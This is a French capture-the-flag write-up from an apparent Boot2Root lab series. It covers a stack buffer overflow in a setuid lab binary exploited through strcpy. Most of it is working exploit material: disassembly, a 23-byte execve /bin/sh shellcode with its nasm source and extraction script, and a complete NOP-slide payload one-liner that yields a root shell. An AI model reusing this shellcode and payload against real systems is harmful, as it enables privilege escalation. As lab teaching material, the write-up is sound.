# Buffer Overflow Nopslide exploit

A partir de **zaz**, on reprend le binaire **exploit_me** que l'on avait exploiter dans le [writeup1](https://github.com/maginist/Boot2Root/blob/master/writeup1.md) :

```
gdb -q ./exploit_me
(gdb)> disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
```
<pre><code>0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)</code></pre>
>Le compare nous indique que le programme attend 1 seul argument.
```
0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
```
> **strcpy** copie et stocke notre premier argument dans la stack sans vérifier si la taille de l'argument correspond à celle du buffer de destination.

La fonction est donc exploitable par <code>buffer_overflow</code> pour corrompre les valeurs sauvegardées de **%ebp** et **%eip**.

On va effectuer une **nopslide attack**, qui consiste a placer un **SHELLCODE**, executant un **"shell"** ou une autre fonction, au milieu d'une **slide de nop** (**"\x90"**).
> L'instruction **nop** n'a comme seul but de passer a l'instruction suivante.

On connait l'adresse du buffer qui est :

<code>0xbffff640</code>

On connait l'**offset**, auquel on ecrase **%eip**, qui est de 140 et possede une taille de 4.

On utilse le **SHELLCODE** 23 bytes, génerer de la maniere suivante :

### <span>script.sh</span>
```bash
#!/bin/sh
nasm -f elf binsh.s
objdump -d binsh.o
echo ''
objdump -d binsh.o | cut -d '	' -f2 | tr '\n' ' ' | sed $'s/^.*_main>:/shellcode::::::\\\n/' | tr -s ' ' | sed 's/ /\\x/g' | sed 's/......$//'
echo '\n'
LENGTH=`objdump -d binsh.o | tail -1 | cut -f1 | sed 's/.$//' | sed 's/ *//'`
LENGTHDEC=$(echo "obase=10; ibase=16; $LENGTH" | bc)
printf "lenght = 0x%d // %d \n" $LENGTH $LENGTHDEC
rm binsh.o
```
### <span>binsh.s</span>

```as
section .text
global _main

_main:
xor eax, eax	; eax = 0
push eax		; push null termination
push 0x68732f2f	; hs//
push 0x6e69622f	; nib/
mov ebx, esp	; path
mov ecx, eax	; argv
mov edx, eax	; env
mov al, 0xb		; sysall code for execve
int 0x80
nop
```

<pre><code>> sh script.sh

binsh.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_main>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 2f 2f 73 68          push   $0x68732f2f
   8:   68 2f 62 69 6e          push   $0x6e69622f
   d:   89 e3                   mov    %esp,%ebx
   f:   89 c1                   mov    %eax,%ecx
  11:   89 c2                   mov    %eax,%edx
  13:   b0 0b                   mov    $0xb,%al
  15:   cd 80                   int    $0x80
  17:   90                      nop

shellcode:
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80

lenght = 0x17 // 23
</code></pre>

On prepare un **PAYLOAD** de 144 charactères, composé de la maniere suivante :
<pre><code>NOPSLIDE * 60 + SHELLCODE + NOPSLIDE * 57 + Address dans la 1ère NOPSLIDE/code></code></pre>

<pre><code>./exploit_me `python -c "print '\x90'*60 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90'*57 + '\x50\xf6\xff\xbf'"`</code></pre>

Nous obtenons un terminal avec les droits **root** :
```
> id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```